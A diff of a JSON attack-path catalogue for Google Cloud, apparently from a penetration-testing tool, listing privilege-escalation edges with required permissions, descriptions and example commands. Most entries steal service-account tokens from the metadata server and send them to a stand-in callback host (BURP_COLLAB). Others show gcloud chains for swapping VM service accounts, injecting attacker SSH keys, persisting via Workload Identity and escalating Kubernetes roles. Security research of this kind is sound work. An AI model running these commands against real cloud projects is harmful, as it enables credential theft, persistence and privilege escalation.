-      "example_command": "modules exploit_cloudworkflows_execution_as_sa --target-sa {target_sa} --exfil-url https://BURP_COLLAB",
-      "capability_resource_type": "cloudworkflowsexecution"
-    },
-    "CREATE_BATCH_JOB_AS_SA": {
-      "requires": [
-        {
-          "permissions": [
-            "batch.jobs.create"
-          ]
-        }
-      ],
-      "edge": "CREATE_BATCH_JOB_AS_SA",
-      "via": "capability",
-      "act_as": {
-        "permissions": [
-          "iam.serviceAccounts.actAs"
-        ],
-        "on": "service-account"
-      },
-      "description": "Submit a Cloud Batch job that runs as the target SA, executing arbitrary container workloads that can exfiltrate the SA's GCP metadata credentials.",
-      "example_command": "modules exploit_batch_job_as_sa --target-sa {target_sa} --exfil-url https://BURP_COLLAB",
-      "capability_resource_type": "batchjob"
-    },
-    "CREATE_DATAPROC_BATCH_AS_SA": {
-      "requires": [
-        {
-          "permissions": [
-            "dataproc.batches.create"
-          ]
-        }
-      ],
-      "edge": "CREATE_DATAPROC_BATCH_AS_SA",
-      "via": "capability",
-      "act_as": {
-        "permissions": [
-          "iam.serviceAccounts.actAs"
-        ],
-        "on": "service-account"
-      },
-      "description": "Submit a Dataproc Serverless batch workload bound to the target SA, executing arbitrary PySpark/Spark code that can steal the SA's GCP credentials from the metadata server.",
-      "example_command": "modules exploit_dataproc_batch_as_sa --target-sa {target_sa} --exfil-url https://BURP_COLLAB",
-      "capability_resource_type": "dataprocbatch"
-    },
-    "CREATE_DATAPROC_WORKFLOW_TEMPLATE_AS_SA": {
-      "requires": [
-        {
-          "permissions": [
-            "dataproc.workflowTemplates.create",
-            "dataproc.workflowTemplates.instantiate"
-          ]
-        }
-      ],
-      "edge": "CREATE_DATAPROC_WORKFLOW_TEMPLATE_AS_SA",
-      "via": "capability",
-      "act_as": {
-        "permissions": [
-          "iam.serviceAccounts.actAs"
-        ],
-        "on": "service-account"
-      },
-      "description": "Create and instantiate a Dataproc Workflow Template that runs as the target SA, executing arbitrary Hadoop/Spark jobs to steal the SA's credentials from the metadata server.",
-      "example_command": "modules exploit_dataproc_workflow_template_as_sa --target-sa {target_sa} --exfil-url https://BURP_COLLAB",
-      "capability_resource_type": "dataprocworkflowtemplate"
-    },
-    "CREATE_DATAFLOW_JOB_AS_SA": {
-      "requires": [
-        {
-          "permissions": [
-            "dataflow.jobs.create"
-          ]
-        }
-      ],
-      "edge": "CREATE_DATAFLOW_JOB_AS_SA",
-      "via": "capability",
-      "act_as": {
-        "permissions": [
-          "iam.serviceAccounts.actAs"
-        ],
-        "on": "service-account"
-      },
-      "description": "Launch a Dataflow streaming or batch pipeline that runs as the target SA, executing arbitrary user code on worker VMs to steal the SA's GCP credentials.",
-      "example_command": "modules exploit_dataflow_job_as_sa --target-sa {target_sa} --exfil-url https://BURP_COLLAB",
-      "capability_resource_type": "dataflowjob"
-    },
-    "CREATE_DATAFLOW_DATAPIPELINE_AS_SA": {
-      "requires": [
-        {
-          "permissions": [
-            "datapipelines.pipelines.create"
-          ]
-        }
-      ],
-      "edge": "CREATE_DATAFLOW_DATAPIPELINE_AS_SA",
-      "via": "capability",
-      "act_as": {
-        "permissions": [
-          "iam.serviceAccounts.actAs"
-        ],
-        "on": "service-account"
-      },
-      "description": "Create a Cloud Data Pipelines workflow bound to the target SA, using it to launch Dataflow jobs that execute as the SA and exfiltrate credentials.",
-      "example_command": "modules exploit_dataflow_datapipeline_as_sa --target-sa {target_sa} --exfil-url https://BURP_COLLAB",
-      "capability_resource_type": "dataflowdatapipeline"
-    },
-    "CREATE_DATAPLEX_TASK_AS_SA": {
-      "requires": [
-        {
-          "permissions": [
-            "dataplex.tasks.create",
-            "dataplex.tasks.run"
-          ]
-        }
-      ],
-      "edge": "CREATE_DATAPLEX_TASK_AS_SA",
-      "via": "capability",
-      "act_as": {
-        "permissions": [
-          "iam.serviceAccounts.actAs"
-        ],
-        "on": "service-account"
-      },
-      "description": "Create a Dataplex task that runs as the target SA on a Spark or Spark SQL workload, stealing the SA's credentials from the GCE metadata server.",
-      "example_command": "modules exploit_dataplex_task_as_sa --target-sa {target_sa} --exfil-url https://BURP_COLLAB",
-      "capability_resource_type": "dataplextask"
-    },
-    "CREATE_VERTEX_CUSTOM_JOB_AS_SA": {
-      "requires": [
-        {
-          "permissions": [
-            "aiplatform.customJobs.create"
-          ]
-        }
-      ],
-      "edge": "CREATE_VERTEX_CUSTOM_JOB_AS_SA",
-      "via": "capability",
-      "act_as": {
-        "permissions": [
-          "iam.serviceAccounts.actAs"
-        ],
-        "on": "service-account"
-      },
-      "description": "Submit a Vertex AI Custom Job bound to the target SA, running arbitrary training container code that reads the SA's OAuth token from the GCE metadata endpoint.",
-      "example_command": "modules exploit_vertex_custom_job_as_sa --target-sa {target_sa} --exfil-url https://BURP_COLLAB",
-      "capability_resource_type": "vertexcustomjob"
-    },
-    "CREATE_VERTEX_PIPELINE_JOB_AS_SA": {
-      "requires": [
-        {
-          "permissions": [
-            "aiplatform.pipelineJobs.create"
-          ]
-        }
-      ],
-      "edge": "CREATE_VERTEX_PIPELINE_JOB_AS_SA",
-      "via": "capability",
-      "act_as": {
-        "permissions": [
-          "iam.serviceAccounts.actAs"
-        ],
-        "on": "service-account"
-      },
-      "description": "Submit a Vertex AI Pipeline job that runs its steps as the target SA, enabling container-level code execution to steal the SA's access token from metadata.",
-      "example_command": "modules exploit_vertex_pipeline_job_as_sa --target-sa {target_sa} --exfil-url https://BURP_COLLAB",
-      "capability_resource_type": "vertexpipelinejob"
-    },
-    "CREATE_VERTEX_REASONING_ENGINE_AS_SA": {
-      "requires": [
-        {
-          "permissions": [
-            "aiplatform.reasoningEngines.create"
-          ]
-        }
-      ],
-      "edge": "CREATE_VERTEX_REASONING_ENGINE_AS_SA",
-      "via": "capability",
-      "act_as": {
-        "permissions": [
-          "iam.serviceAccounts.actAs"
-        ],
-        "on": "service-account"
-      },
-      "description": "Create a Vertex AI Reasoning Engine (Agentspace) bound to the target SA, deploying arbitrary Python code that steals the SA's credentials from the GCE metadata server.",
-      "example_command": "modules exploit_vertex_reasoning_engine_as_sa --target-sa {target_sa} --exfil-url https://BURP_COLLAB",
-      "capability_resource_type": "vertexreasoningengine"
-    },
-    "CREATE_VERTEX_ENDPOINT_AS_SA": {
-      "requires": [
-        {
-          "permissions": [
-            "aiplatform.endpoints.create",
-            "aiplatform.endpoints.deploy"
-          ]
-        }
-      ],
-      "edge": "CREATE_VERTEX_ENDPOINT_AS_SA",
-      "via": "capability",
-      "act_as": {
-        "permissions": [
-          "iam.serviceAccounts.actAs"
-        ],
-        "on": "service-account"
-      },
-      "description": "Create a Vertex AI Endpoint and deploy a malicious model container that runs as the target SA, exploiting metadata server access in the prediction worker pods.",
-      "example_command": "modules exploit_vertex_endpoint_as_sa --target-sa {target_sa} --exfil-url https://BURP_COLLAB",
-      "capability_resource_type": "vertexendpoint"
-    },
-    "CREATE_APPENGINE_VERSION_AS_SA": {
-      "requires": [
-        {
-          "permissions": [
-            "appengine.versions.create"
-          ]
-        }
-      ],
-      "edge": "CREATE_APPENGINE_VERSION_AS_SA",
-      "via": "capability",
-      "act_as": {
-        "permissions": [
-          "iam.serviceAccounts.actAs"
-        ],
-        "on": "service-account"
-      },
-      "description": "Deploy a new App Engine version bound to the target SA, hosting arbitrary application code that reads the SA's credentials from the App Engine metadata endpoint.",
-      "example_command": "modules exploit_appengine_version_as_sa --target-sa {target_sa} --exfil-url https://BURP_COLLAB",
-      "capability_resource_type": "appengineversion"
-    },
-    "UPDATE_APPENGINE_APPLICATION_AS_SA": {
-      "requires": [
-        {
-          "permissions": [
-            "appengine.applications.update"
-          ]
-        }
-      ],
-      "edge": "UPDATE_APPENGINE_APPLICATION_AS_SA",
-      "via": "capability",
-      "act_as": {
-        "permissions": [
-          "iam.serviceAccounts.actAs"
-        ],
-        "on": "service-account"
-      },
-      "description": "PATCH the App Engine application's service account field to the target SA, causing all subsequent version deployments and request handling to run as the target SA without deploying a new version.",
-      "example_command": "modules exploit_appengine_version_as_sa --target-sa {target_sa} --update-app",
-      "capability_resource_type": "appengineapp"
-    },
-    "CREATE_COMPOSER_ENV_AS_SA": {
-      "requires": [
-        {
-          "permissions": [
-            "composer.environments.create"
-          ]
-        }
-      ],
-      "edge": "CREATE_COMPOSER_ENV_AS_SA",
-      "via": "capability",
-      "act_as": {
-        "permissions": [
-          "iam.serviceAccounts.actAs"
-        ],
-        "on": "service-account"
-      },
-      "description": "Create a Cloud Composer environment bound to the target SA, running Airflow DAG tasks that steal the SA's credentials from the GKE metadata server.",
-      "example_command": "modules exploit_composer_env_as_sa --target-sa {target_sa} --exfil-url https://BURP_COLLAB",
-      "capability_resource_type": "composerenv"
-    },
-    "CREATE_APP_INTEGRATION_AS_SA": {
-      "requires": [
-        {
-          "permissions": [
-            "integrations.integrations.create"
-          ]
-        }
-      ],
-      "edge": "CREATE_APP_INTEGRATION_AS_SA",
-      "via": "capability",
-      "act_as": {
-        "permissions": [
-          "iam.serviceAccounts.actAs"
-        ],
-        "on": "service-account"
-      },
-      "description": "Create an Application Integration workflow bound to the target SA, using REST Task steps to exfiltrate the SA's OAuth token to a callback URL.",
-      "example_command": "modules exploit_app_integration_as_sa --target-sa {target_sa} --exfil-url https://BURP_COLLAB",
-      "capability_resource_type": "appintegration"
-    },
-    "CREATE_FIREBASE_BACKEND_AS_SA": {
-      "requires": [
-        {
-          "permissions": [
-            "firebaseapphosting.backends.create"
-          ]
-        }
-      ],
-      "edge": "CREATE_FIREBASE_BACKEND_AS_SA",
-      "via": "capability",
-      "act_as": {
-        "permissions": [
-          "iam.serviceAccounts.actAs"
-        ],
-        "on": "service-account"
-      },
-      "description": "Create a Firebase App Hosting backend bound to the target SA, deploying arbitrary Next.js/web server code that exfiltrates the SA's credentials from the metadata endpoint.",
-      "example_command": "modules exploit_firebase_app_hosting_backend_as_sa --target-sa {target_sa} --exfil-url https://BURP_COLLAB",
-      "capability_resource_type": "firebasebackend"
-    },
-    "CREATE_WORKBENCH_INSTANCE_AS_SA": {
-      "requires": [
-        {
-          "permissions": [
-            "notebooks.instances.create"
-          ]
-        }
-      ],
-      "edge": "CREATE_WORKBENCH_INSTANCE_AS_SA",
-      "via": "capability",
-      "act_as": {
-        "permissions": [
-          "iam.serviceAccounts.actAs"
-        ],
-        "on": "service-account"
-      },
-      "description": "Create a Vertex AI Workbench instance bound to the target SA, using the JupyterLab environment to execute arbitrary notebooks that steal the SA's GCP credentials.",
-      "example_command": "modules exploit_workbench_instance_as_sa --target-sa {target_sa} --exfil-url https://BURP_COLLAB",
-      "capability_resource_type": "notebooksworkbench"
-    },
-    "CREATE_NOTEBOOKS_EXECUTION_AS_SA": {
-      "requires": [
-        {
-          "permissions": [
-            "notebooks.executions.create"
-          ]
-        }
-      ],
-      "edge": "CREATE_NOTEBOOKS_EXECUTION_AS_SA",
-      "via": "capability",
-      "act_as": {
-        "permissions": [
-          "iam.serviceAccounts.actAs"
-        ],
-        "on": "service-account"
-      },
-      "description": "Submit a Notebooks Execution job that runs a Jupyter notebook as the target SA, executing arbitrary Python code that exfiltrates the SA's credentials from the GCE metadata endpoint.",
-      "example_command": "modules exploit_notebooks_execution_as_sa --target-sa {target_sa} --exfil-url https://BURP_COLLAB",
-      "capability_resource_type": "notebooksexecution"
-    },
-    "CREATE_TPU_NODE_AS_SA": {
-      "requires": [
-        {
-          "permissions": [
-            "tpu.nodes.create"
-          ]
-        }
-      ],
-      "edge": "CREATE_TPU_NODE_AS_SA",
-      "via": "capability",
-      "act_as": {
-        "permissions": [
-          "iam.serviceAccounts.actAs"
-        ],
-        "on": "service-account"
-      },
-      "description": "Create a Cloud TPU node bound to the target SA, running startup script code on the host VM to steal the SA's credentials from the GCE metadata endpoint.",
-      "example_command": "modules exploit_tpu_node_as_sa --target-sa {target_sa} --exfil-url https://BURP_COLLAB",
-      "capability_resource_type": "tpunode"
-    },
-    "CREATE_WORKSTATION_AS_SA": {
-      "requires": [
-        {
-          "permissions": [
-            "workstations.workstationConfigs.create",
-            "workstations.workstations.create"
-          ]
-        }
-      ],
-      "edge": "CREATE_WORKSTATION_AS_SA",
-      "via": "capability",
-      "act_as": {
-        "permissions": [
-          "iam.serviceAccounts.actAs"
-        ],
-        "on": "service-account"
-      },
-      "description": "Create a Cloud Workstation config and workstation bound to the target SA, using the workstation's interactive development environment to steal the SA's credentials.",
-      "example_command": "modules exploit_workstation_as_sa --target-sa {target_sa} --exfil-url https://BURP_COLLAB",
-      "capability_resource_type": "workstation"
-    },
-    "CREATE_DATAFUSION_INSTANCE_AS_SA": {
-      "requires": [
-        {
-          "permissions": [
-            "datafusion.instances.create"
-          ]
-        }
-      ],
-      "edge": "CREATE_DATAFUSION_INSTANCE_AS_SA",
-      "via": "capability",
-      "act_as": {
-        "permissions": [
-          "iam.serviceAccounts.actAs"
-        ],
-        "on": "service-account"
-      },
-      "description": "Create a Cloud Data Fusion instance bound to the target SA (as its Dataproc service account), deploying ETL pipelines that run on Dataproc clusters with the SA's identity.",
-      "example_command": "modules exploit_datafusion_instance_as_sa --target-sa {target_sa} --exfil-url https://BURP_COLLAB",
-      "capability_resource_type": "datafusioninstance"
-    },
-    "CREATE_CLOUDDEPLOY_RELEASE_AS_SA": {
-      "requires": [
-        {
-          "permissions": [
-            "clouddeploy.deliveryPipelines.create",
-            "clouddeploy.targets.create",
-            "clouddeploy.releases.create",
-            "clouddeploy.rollouts.create"
-          ]
-        }
-      ],
-      "edge": "CREATE_CLOUDDEPLOY_RELEASE_AS_SA",
-      "via": "capability",
-      "act_as": {
-        "permissions": [
-          "iam.serviceAccounts.actAs"
-        ],
-        "on": "service-account"
-      },
-      "description": "Create a Cloud Deploy pipeline, target, release, and rollout that deploys a malicious container as the target SA, stealing the SA's credentials from the deployment runtime.",
-      "example_command": "modules exploit_clouddeploy_target_as_sa --target-sa {target_sa} --exfil-url https://BURP_COLLAB",
-      "capability_resource_type": "clouddeployrelease"
-    },
-    "CREATE_DEPLOYMENTMANAGER_DEPLOYMENT_AS_SA": {
-      "requires": [
-        {
-          "permissions": [
-            "deploymentmanager.deployments.create"
-          ]
-        }
-      ],
-      "edge": "CREATE_DEPLOYMENTMANAGER_DEPLOYMENT_AS_SA",
-      "via": "capability",
-      "act_as": {
-        "permissions": [
-          "iam.serviceAccounts.actAs"
-        ],
-        "on": "service-account"
-      },
-      "description": "Create a Deployment Manager deployment that provisions a Compute VM assigned to the target SA, running a startup script exfil to steal the SA's credentials from the metadata server.",
-      "example_command": "modules exploit_deploymentmanager_vm_as_sa --target-sa {target_sa} --exfil-url https://BURP_COLLAB",
-      "capability_resource_type": "deploymentmanagerdeployment"
-    },
-    "CREATE_INFRAMANAGER_DEPLOYMENT_AS_SA": {
-      "requires": [
-        {
-          "permissions": [
-            "config.deployments.create"
-          ]
-        }
-      ],
-      "edge": "CREATE_INFRAMANAGER_DEPLOYMENT_AS_SA",
-      "via": "capability",
-      "act_as": {
-        "permissions": [
-          "iam.serviceAccounts.actAs"
-        ],
-        "on": "service-account"
-      },
-      "description": "Create an Infrastructure Manager (Cloud Config Controller) deployment bound to the target SA, applying Terraform that provisions resources executing as the SA.",
-      "example_command": "modules exploit_inframanager_deployment_as_sa --target-sa {target_sa} --exfil-url https://BURP_COLLAB",
-      "capability_resource_type": "inframanagerdeployment"
-    },
-    "CREATE_VMMIGRATION_IMAGE_IMPORT_AS_SA": {
-      "requires": [
-        {
-          "permissions": [
-            "vmmigration.imageImports.create",
-            "vmmigration.targetProjects.create"
-          ]
-        }
-      ],
-      "edge": "CREATE_VMMIGRATION_IMAGE_IMPORT_AS_SA",
-      "via": "capability",
-      "act_as": {
-        "permissions": [
-          "iam.serviceAccounts.actAs"
-        ],
-        "on": "service-account"
-      },
-      "description": "Create a VM Migration image import that provisions a new Compute VM running as the target SA, with a startup script that exfiltrates the SA's credentials from the metadata endpoint.",
-      "example_command": "modules exploit_vmmigration_image_import_as_sa --target-sa {target_sa} --exfil-url https://BURP_COLLAB",
-      "capability_resource_type": "vmmigrationimageimport"
-    },
-    "CREATE_VMMIGRATION_MIGRATING_VM_AS_SA": {
-      "requires": [
-        {
-          "permissions": [
-            "vmmigration.sources.create",
-            "vmmigration.migratingVms.create"
-          ]
-        }
-      ],
-      "edge": "CREATE_VMMIGRATION_MIGRATING_VM_AS_SA",
-      "via": "capability",
-      "act_as": {
-        "permissions": [
-          "iam.serviceAccounts.actAs"
-        ],
-        "on": "service-account"
-      },
-      "description": "Create a VM Migration source and MigratingVm resource with computeEngineTargetDefaults.serviceAccount set to the target SA. When cutover is triggered, the resulting GCE VM runs as the target SA and exposes its token via the GCE metadata endpoint.",
-      "example_command": "modules exploit_vmmigration_migrating_vm_as_sa --target-sa {target_sa} --exfil-url https://BURP_COLLAB",
-      "capability_resource_type": "vmmigrationmigratingvm"
-    },
-    "CONFIGURE_WORKLOAD_IDENTITY_IMPERSONATION": {
-      "requires": [
-        {
-          "permissions": [
-            "iam.workloadIdentityPools.create",
-            "iam.workloadIdentityPoolProviders.create"
-          ]
-        }
-      ],
-      "edge": "CONFIGURE_WORKLOAD_IDENTITY_IMPERSONATION",
-      "via": "capability",
-      "act_as": {
-        "permissions": [
-          "iam.serviceAccounts.actAs"
-        ],
-        "on": "service-account"
-      },
-      "description": "Create a Workload Identity Pool and OIDC provider that allows an external identity to impersonate the target SA. Combined with roles/iam.serviceAccountAdmin or setIamPolicy on the SA (covered by CAN_MODIFY_SA_IAM), the attacker establishes persistent token exchange that survives revocation of the initial credentials.",
-      "example_command": "modules exploit_wif_impersonation --target-sa {target_sa} --mode setup --project-id {project_id}",
-      "capability_resource_type": "workloadidentityprovider"
-    },
-    "CREATE_BQ_SPARK_PROCEDURE_AS_SA": {
-      "requires": [
-        {
-          "permissions": [
-            "bigquery.connections.create"
-          ]
+          "on": "service-account"
         },
-        {
-          "permissions": [
-            "bigquery.datasets.create"
-          ]
-        },
-        {
-          "permissions": [
-            "bigquery.jobs.create"
-          ]
-        }
-      ],
-      "edge": "CREATE_BQ_SPARK_PROCEDURE_AS_SA",
-      "via": "capability",
-      "act_as": {
-        "permissions": [
-          "iam.serviceAccounts.actAs"
-        ],
-        "on": "service-account"
+        "description": "Inject a startup script into a STOPPED Compute Engine instance's metadata, then start it to execute code as the instance's attached service account.",
+        "example_command": "modules exploit_compute_instance_as_sa --project-id {project_id} --instance-name {target_resource} --exfil-url https://BURP_COLLAB --mode startup-script"
       },
-      "description": "Create a BigQuery Spark connection with an auto-managed service account, then run a Spark stored procedure that executes arbitrary Python code as that SA, exfiltrating credentials from the GCE metadata endpoint.",
-      "example_command": "modules exploit_bq_spark_procedure_as_sa --exfil-url https://BURP_COLLAB",
-      "capability_resource_type": "bqsparkprocedure"
-    },
-    "CREATE_CLOUDBUILD_TRIGGER_AS_SA": {
-      "requires": [
-        {
-          "permissions": [
-            "cloudbuild.triggers.create"
-          ]
-        }
-      ],
-      "edge": "CREATE_CLOUDBUILD_TRIGGER_AS_SA",
-      "via": "capability",
-      "act_as": {
-        "permissions": [
-          "iam.serviceAccounts.actAs"
+      "INJECT_SSH_KEY_PROJECT_METADATA": {
+        "requires": [
+          {
+            "permissions": [
+              "compute.projects.setCommonInstanceMetadata"
+            ]
+          }
         ],
-        "on": "service-account"
-      },
-      "description": "Create a Cloud Build trigger pinned to the target SA and run it, executing arbitrary build steps with that SA's credentials and exfiltrating its OAuth token via Cloud Logging or HTTP callback.",
-      "example_command": "modules exploit_cloudbuild_trigger_as_sa --target-sa {target_sa} --exfil-url https://BURP_COLLAB --cleanup",
-      "capability_resource_type": "cloudbuildtrigger"
-    },
-    "CREATE_APIGATEWAY_OIDC_AS_SA": {
-      "requires": [
-        {
+        "edge": "INJECT_SSH_KEY_PROJECT_METADATA",
+        "via": "capability",
+        "act_as": {
           "permissions": [
-            "apigateway.apis.create",
-            "apigateway.apiconfigs.create",
-            "apigateway.gateways.create"
-          ]
-        }
-      ],
-      "edge": "CREATE_APIGATEWAY_OIDC_AS_SA",
-      "via": "capability",
-      "act_as": {
-        "permissions": [
-          "iam.serviceAccounts.actAs"
-        ],
-        "on": "service-account"
-      },
-      "description": "Create an API Gateway API, config, and gateway backed by a Cloud Run or backend URL configured to issue OIDC tokens signed as the target SA. The OIDC token is exchanged for an OAuth access token via Workload Identity Federation or used directly.",
-      "example_command": "modules exploit_apigateway_as_sa_oidc --target-sa {target_sa} --exfil-url https://BURP_COLLAB --cleanup",
-      "capability_resource_type": "apigateway"
-    },
-    "CREATE_CLOUDTASKS_TASK_ON_EXISTING_QUEUE_AS_SA": {
-      "requires": [
-        {
-          "permissions": [
-            "cloudtasks.tasks.create"
+            "iam.serviceAccounts.actAs"
           ],
-          "on": "cloudtasksqueue"
-        }
-      ],
-      "edge": "CREATE_CLOUDTASKS_TASK_ON_EXISTING_QUEUE_AS_SA",
-      "via": "resource",
-      "act_as": {
-        "permissions": [
-          "iam.serviceAccounts.actAs"
-        ],
-        "on": "service-account"
+          "on": "service-account"
+        },
+        "description": "Write an attacker SSH public key into the project-level common instance metadata (ssh-keys entry), granting SSH login to all project VMs that inherit project metadata. From any VM, steal the attached SA's credentials via the local GCE metadata endpoint.",
+        "example_command": "modules exploit_instance_ssh_keys --project-id {project_id} --project-level --ssh-pub-key ATTACKER_PUB_KEY",
+        "capability_resource_type": "project"
       },
-      "description": "Create an HTTP task on an existing Cloud Tasks queue that already has a service account configured, using the queue's SA to authenticate outbound HTTP requests and exfiltrate its OAuth token to a callback URL.",
-      "example_command": "modules exploit_cloudtasks_task_as_sa --target-sa {target_sa} --action callback --exfil-url https://BURP_COLLAB"
+      "IAP_TUNNEL_TO_VM_SA": {
+        "requires_groups": [
+          {
+            "id": "iap_perms",
+            "permissions": [
+              "iap.tunnelInstances.accessViaIAP",
+              "compute.instances.get"
+            ],
+            "resource_scopes_possible": [
+              "project",
+              "computeinstance"
+            ],
+            "target_selector": {
+              "mode": "resource_types",
+              "resource_types": [
+                "computeinstance"
+              ],
+              "status_in": [
+                "RUNNING"
+              ]
+            }
+          }
+        ],
+        "combo_hop": {
+          "hops": [
+            {
+              "edge_from_subject": "IAP_TUNNEL_TO_VM_SA",
+              "node_mode": "resource",
+              "from_groups": [
+                "iap_perms"
+              ],
+              "selector": {
+                "mode": "resource_types",
+                "resource_types": [
+                  "computeinstance"
+                ],
+                "status_in": [
+                  "RUNNING"
+                ]
+              }
+            }
+          ],
+          "edge_to_target": "IAP_TUNNEL_TO_VM_SA",
+          "target_from_groups": [
+            "iap_perms"
+          ],
+          "requires_resource_exists": false,
+          "capability_resource_type": ""
+        },
+        "multi_permission_type": "complex",
+        "same_scope_required": false,
+        "same_project_required": true,
+        "via": "resource",
+        "description": "Tunnel into a running Compute VM via IAP (Identity-Aware Proxy), SSH in (via OS Login osAdminLogin/osLogin or injected key), then steal the attached SA token via the GCE metadata endpoint. actAs is NOT required: the IAP tunnel opens a TCP path to port 22 with no IAM actAs check; SSH auth uses OS Login permissions or project metadata keys; curl to metadata.google.internal is a local network call inside the VM. Live-validated 2026-10-01: gcloud start-iap-tunnel succeeded with only iap.tunnelInstances.accessViaIAP + compute.instances.get (no actAs). Edge targets the VM; the SA is reachable via EXECUTES_WITH from the VM.",
+        "example_command": "modules exploit_iap_tunnel_vm_sa --instance-name {target_resource} --zone us-central1-a",
+        "status": "VALIDATED"
+      },
+      "SWAP_COMPUTE_INSTANCE_SA": {
+        "requires": [
+          {
+            "permissions": [
+              "compute.instances.setServiceAccount"
+            ],
+            "on": "computeinstance"
+          },
+          {
+            "permissions": [
+              "compute.instances.stop"
+            ],
+            "on": "computeinstance"
+          },
+          {
+            "permissions": [
+              "compute.instances.start"
+            ],
+            "on": "computeinstance"
+          }
+        ],
+        "edge": "SWAP_VM_SA_VIA_setServiceAccount",
+        "via": "resource",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "Stop a Compute Engine VM, swap its attached SA to a high-privilege SA, restart it, then SSH in (or use startup-script PE) to retrieve the new SA token from the GCE metadata endpoint. All three permissions are individually required (none removable). compute.instances.get is NOT in the minimum set \u2014 the stop/setServiceAccount/start sequence succeeds even if get returns 403.",
+        "example_command": "gcloud compute instances stop VM; gcloud compute instances set-service-account VM --service-account=TARGET_SA --scopes=cloud-platform; gcloud compute instances start VM; gcloud compute ssh VM -- curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -H Metadata-Flavor:Google",
+        "status": "VALIDATED"
+      },
+      "OS_ADMIN_LOGIN_COMPUTE_AS_SA": {
+        "permissions": [
+          "compute.instances.osAdminLogin"
+        ],
+        "on": "computeinstance",
+        "description": "SSH to a Compute Engine VM as root via OS Login. From the root shell, access the GCE metadata endpoint to steal the VM's attached SA token.",
+        "example_command": "gcloud compute ssh VM --zone=ZONE; curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -H \"Metadata-Flavor: Google\"",
+        "via": "resource",
+        "status": "PROPOSED"
+      },
+      "OS_LOGIN_COMPUTE_AS_SA": {
+        "permissions": [
+          "compute.instances.osLogin"
+        ],
+        "on": "computeinstance",
+        "description": "SSH to a Compute Engine VM (non-root) via OS Login. If the VM has metadata server access, steal the SA token. Works when the VM is configured with compute.disableMetadataServer=false (default).",
+        "example_command": "gcloud compute ssh VM --zone=ZONE; curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -H \"Metadata-Flavor: Google\"",
+        "via": "resource",
+        "status": "PROPOSED"
+      },
+      "CREATE_COMPUTE_INSTANCE_AS_SA": {
+        "requires": [
+          {
+            "permissions": [
+              "compute.instances.create",
+              "compute.disks.create",
+              "compute.subnetworks.use",
+              "compute.instances.setServiceAccount"
+            ],
+            "on": "project"
+          }
+        ],
+        "edge": "CREATE_COMPUTE_INSTANCE_AS_SA",
+        "via": "capability",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "Create a new Compute Engine VM with a target SA attached and a startup script. The VM runs as the target SA; the startup script can access the GCE metadata endpoint to steal the SA token. Live-validated 2026-09-28: compute.instances.setServiceAccount satisfies the actAs check for Compute Engine, making explicit actAs optional when this permission is held.",
+        "example_command": "gcloud compute instances create research-vm --machine-type=e2-micro --service-account=TARGET_SA --scopes=cloud-platform --metadata-from-file=startup-script=/tmp/exfil.sh; # or: modules exploit_create_compute_instance_as_sa --project-id {project_id} --target-sa TARGET_SA --exfil-url https://BURP_COLLAB"
+      },
+      "ACCESS_VM_VIA_IAP_TUNNEL": {
+        "edge": "CAN_ACCESS_VM_VIA_IAP_TUNNEL",
+        "requires": [
+          {
+            "permissions": [
+              "iap.tunnelInstances.accessViaIAP",
+              "compute.instances.osAdminLogin"
+            ]
+          }
+        ],
+        "via": "capability",
+        "description": "Use IAP TCP tunneling to SSH into an existing GCE VM (no external IP required). iap.tunnelInstances.accessViaIAP establishes the WebSocket tunnel; compute.instances.osAdminLogin grants root OS Login access. Once on the VM, query the GCE metadata server for the VM's attached service account token (ya29.*). Requires a firewall rule allowing IAP source range (35.235.240.0/20) on port 22 \u2014 this is typically present in orgs using IAP for BeyondCorp. No actAs required \u2014 gets the token of whatever SA is already attached to the target VM.",
+        "example_command": "modules run exploit_iap_tunnel_vm_sa --target-instance INSTANCE_NAME --zone ZONE",
+        "caveats": [
+          "No actAs required \u2014 you get the token of the SA already on the VM, not an arbitrary SA",
+          "Requires a firewall rule allowing IAP source range 35.235.240.0/20 on port 22 (or other port)",
+          "OS Login must be enabled on the VM/project \u2014 true by default when enable-oslogin metadata is set",
+          "compute.instances.osAdminLogin grants root access; compute.instances.osLogin grants user access"
+        ]
+      },
+      "SET_SA_COMPUTE_STARTUP_SA": {
+        "edge": "CAN_SET_SA_AND_START_COMPUTE",
+        "requires": [
+          {
+            "permissions": [
+              "compute.instances.setServiceAccount",
+              "compute.instances.start"
+            ],
+            "on": "computeinstance",
+            "status_in": [
+              "STOPPED"
+            ]
+          }
+        ],
+        "via": "resource",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "Swap a stopped Compute Engine instance's service account to the target SA, then start it. The VM runs as the target SA; its startup script can exfiltrate a token via the GCE metadata server. Does NOT require compute.instances.setMetadata.",
+        "example_command": "modules run exploit_instance_set_service_account --target-sa {target_sa} --instance INSTANCE --zone ZONE"
+      }
+    },
+    "gke": {
+      "CREATE_GKE_CLUSTER_AS_SA": {
+        "permissions": [
+          "container.clusters.create"
+        ],
+        "on": "project",
+        "act_as": {
+          "permissions": [
+            "iam.serviceAccounts.actAs"
+          ],
+          "on": "service-account"
+        },
+        "description": "Create a GKE cluster with a high-privilege SA as the node service account. Nodes run as that SA; create privileged pods \u2192 access GCE metadata endpoint \u2192 steal SA token. No SSH required.",
+        "example_command": "gcloud container clusters create CLUSTER --service-account=TARGET_SA --machine-type=e2-micro --num-nodes=1 --zone=us-central1-a",
+        "via": "capability",
+        "status": "PROPOSED"
+      },
+      "ESCALATE_GKE_RBAC_AS_SA": {
+        "permissions": [
+          "container.clusterRoles.escalate"
+        ],
+        "on": "k8scluster",
+        "description": "Escalate a K8s ClusterRole to include broader permissions than the caller holds (kubernetes.io/escalate verb). Allows binding cluster-admin equivalent without having clusterrolebindings.create. From within the cluster: create privileged pods, steal node SA token from GCE metadata endpoint.",
+        "example_command": "kubectl auth can-i escalate clusterroles; kubectl patch clusterrole TARGET_ROLE --patch '{...}'",
+        "via": "resource",
+        "status": "PROPOSED"
+      },
+      "CREATE_GKE_CLUSTERROLEBINDING_AS_SA": {
+        "permissions": [
+          "container.clusterRoleBindings.create"
+        ],
+        "on": "k8scluster",
